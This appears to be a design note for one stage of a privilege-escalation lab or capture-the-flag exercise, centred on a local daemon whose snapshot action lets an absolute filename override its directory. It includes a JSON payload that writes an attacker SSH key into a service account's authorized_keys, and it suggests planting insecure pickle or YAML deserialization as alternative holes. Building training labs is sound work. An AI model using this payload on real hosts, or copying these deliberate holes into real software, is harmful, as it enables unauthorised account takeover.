# Stage 2: Background Internal Telemetry Daemon (IPC Pivot)

## Concept
The `sentry-agent` daemon runs in the background as service account `sentry` (uid 1002) and listens on a local UNIX domain socket at `/run/sentinel/sentry.sock`.
It requires authentication via an ephemeral token readable by users in the `sentinel-users` group (`/var/run/sentinel/sentry.token`).

## Vulnerability & Exploit
The `save_snapshot` action takes a target `filename` and content. It resolves the file destination using Python's `os.path.join(SNAPSHOT_DIR, filename)`.
When `filename` begins with an absolute slash (`/`), `os.path.join` discards `SNAPSHOT_DIR` and returns the absolute path directly.

### Exploit:
Send an authenticated JSON payload to `/run/sentinel/sentry.sock` specifying `filename: "/home/sentry/.ssh/authorized_keys"` and an attacker SSH public key:
```json
{
  "auth_token": "<token>",
  "action": "save_snapshot",
  "filename": "/home/sentry/.ssh/authorized_keys",
  "data": "ssh-rsa AAAAB3NzaC1yc2E... attacker@local\n"
}
```
This enables direct SSH access to the `sentry` service account.

## How to Customize / Extend
- **Different Attack Vectors**:
  - Replace the path override with Python `pickle.loads` or `yaml.load(Loader=yaml.Loader)` for insecure deserialization.
  - Add an external HTTP/gRPC interface to simulate microservice mesh pivoting.
